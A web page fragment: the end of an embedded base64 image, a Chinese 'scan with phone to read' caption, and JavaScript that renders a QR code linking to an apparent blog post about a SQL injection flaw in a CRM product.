U6Vfz1Vy8WyOXvWNterNvNy8M1LXfxedY955Ix4WYvjBe25gW4jbu8LVMe0bt13P6vbJy6tSr+eq5KVVqdsvn2Fmqr/KbPorvtKdI9bsKrlof3ljpW+ucFuIoQfvvYFnIffe/+Ht/wEAAP//r3EW9QAAAAZJREFUAwCfncvLgjKkggAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/fumacrm-Dingding-Ajax-AjaxMailInSend-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 